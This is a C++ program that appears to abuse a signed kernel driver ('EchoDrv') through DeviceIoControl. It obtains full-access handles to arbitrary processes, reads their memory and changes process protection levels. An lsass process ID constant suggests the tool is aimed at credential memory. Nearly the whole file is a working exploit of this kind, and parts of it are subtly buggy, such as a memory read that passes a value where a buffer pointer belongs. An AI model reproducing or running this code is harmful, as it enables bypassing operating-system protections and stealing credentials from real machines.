#include <iostream>

#include <windows.h>
#include <winternl.h>

// DeviceIoControl codes

#define ECHODRV_VERIFY_SIGNATURE  CTL_CODE(0x9E6A, 0x165, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ECHODRV_REGISTER_CALLBACK CTL_CODE(0x252E, 0x782, METHOD_BUFFERED, FILE_READ_ACCESS)
#define ECHODRV_READ_MEMORY       CTL_CODE(0x60A2, 0x849, METHOD_BUFFERED, FILE_READ_ACCESS)
#define ECHODRV_OBTAIN_HANDLE     CTL_CODE(0xE622, 0x92, METHOD_BUFFERED, FILE_READ_ACCESS)

// CreateFileA flags

#define ECHODRV_DESIRED_ACCESS 0xC0000000
#define ECHODRV_SHARE_MODE     0x3
#define ECHODRV_CREATION_DISP  0x3

using ulong = DWORD;

namespace echo::structs
{
	struct VerifySignature
	{
		PUCHAR pb_sig;
		ulong cb_sig;

		char pad[4];

		bool success; ulong unk_0;
	};

	struct RegisterCallback
	{
		DWORD pid1;
		DWORD pid2;
		DWORD pid3;
		DWORD pid4;

		union
		{
			bool success;
			int32_t is_success_4byte;
		};

		DWORD unk_0;
	};

	struct ReadMemory
	{
		void* handle;

		void* read_address;
		void* read_buffer;

		int64_t buffer_size;
		int64_t bytes_out;

		bool success; int unk_0;
	};

	struct ObtainHandle
	{
		ulong proc_id;
		ulong access;

		void* handle_out;

		bool success; int unk_0;
	};

	struct ProtectProcess
	{
		DWORD pid;
		DWORD prot_flag;
		/*
		   PsProtectedTypeNone = 0x0
		   PsProtectedTypeProtectedLight = 0x1
		   PsProtectedTypeProtected = 0x2
		*/
		DWORD is_successful;
		std::uint32_t unk2;
	};
}

namespace echo::driver
{
	void* attached_handle = { };
	void* handle = { };

	bool initialize() noexcept
	{
		handle = CreateFileA("\\\\.\\EchoDrv", ECHODRV_DESIRED_ACCESS,
			ECHODRV_SHARE_MODE, 0ul, ECHODRV_CREATION_DISP, 0ul, nullptr);

		return handle != nullptr;
	}

#pragma warning (disable:6273)

	template <typename Type>
	bool call_driver(const ulong& dispatch_id, Type& packet) noexcept
	{
		printf("Calling DeviceIoControl [%p, %zd]\n", &packet, sizeof(packet));

		return DeviceIoControl
		(
			handle, dispatch_id, &packet, sizeof(packet), &packet, sizeof(packet), nullptr, nullptr
		);
	}

#pragma warning (default:6273)

	bool verify_signature() noexcept
	{
		structs::VerifySignature packet = { };

		const auto status = call_driver<structs::VerifySignature>
			(0x9E6A0594, packet);

		{
			printf("\tReturn from VerifySignature [%d]\n", packet.success);
		}

		return status;
	}

	bool register_callback(
		const ulong& proc_id, 
		const ulong& proc_id2,
		const ulong& proc_id3 = 0,
		const ulong& proc_id4 = 0) noexcept
	{
		structs::RegisterCallback packet = { };

		{
			packet.pid1 = proc_id;
			packet.pid2 = proc_id2;
			packet.pid3 = proc_id3;
			packet.pid4 = proc_id4;
		}

		const auto status = call_driver<structs::RegisterCallback>
			(ECHODRV_REGISTER_CALLBACK, packet);

		{
			printf("\tReturn from RegisterCallback [%d]\n", packet.success);
		}

		return status;
	}

	template <typename Type>
	void read_memory(void* address, size_t size)
	{
		structs::ReadMemory packet = { };

		Type    buffer = { };
		int64_t bytes = { };

		{
			packet.handle = attached_handle;

			std::cout << "handle: " << attached_handle << '\n';
			std::cout << "packet handle: " << attached_handle << '\n';

			packet.read_address = (void*)address;
			packet.read_buffer = (void*)buffer;

			packet.buffer_size = size;

			packet.bytes_out = bytes;
		}

	const auto status = call_driver<structs::ReadMemory>
			(ECHODRV_READ_MEMORY, packet);

	if (status)
		std::cout << "Called RPM!\n";

		std::cout << "ReadMemory called " << buffer << '\n';
	}

	bool obtain_handle(const ulong& proc_id)
	{
		structs::ObtainHandle packet = { };

		{
			packet.proc_id = proc_id;
			packet.access = 0x1F0FFF; // same access as echo
		}

		const auto status = call_driver<structs::ObtainHandle>
			(ECHODRV_OBTAIN_HANDLE, packet);

		{
			attached_handle = packet.handle_out;
		}

		{
			printf("\tReturned from ObtainHandle [%d]\n", packet.success);
			printf("\tAttached handle [0x%p]\n", packet.handle_out);
		}

		return status;
	}

	void protect_process(const ulong& proc_id)
	{
		structs::ProtectProcess packet = { };

		{
			packet.pid = proc_id;
			packet.prot_flag = 0x3; // same access as echo
		}

		const auto status = call_driver<structs::ProtectProcess>(0x25F26648, packet);

		if (packet.is_successful)
			std::cout << "PROTECTED SUCCESSFULLY!\n";
		else
			std::cout << "FAILED TO PROTECT!\n";
	}
}

constexpr ulong lsass = 980ul;
constexpr ulong target_pid = 31868;

int main(int argc, char** argv)
{
	using namespace echo;

	if constexpr (lsass > 0)
	{
		if (!driver::initialize())
			printf("Failed to initialize driver [%d]\n", GetLastError());

		if (!driver::verify_signature())
			printf("Failed to verify signature [%d]\n", GetLastError());

		driver::protect_process(19048);

		if (!driver::obtain_handle(target_pid))
			printf("Failed to obtain handle [%d]\n", GetLastError());

		if (!driver::register_callback(GetCurrentProcessId(), 0))
			printf("Failed to register callback [%d]\n", GetLastError());

		printf("Attached handle [%p]\n\n", driver::attached_handle);

	}
	else
	{
		printf("Please enter valid lsass process ID\n");
	}

	return getchar();
}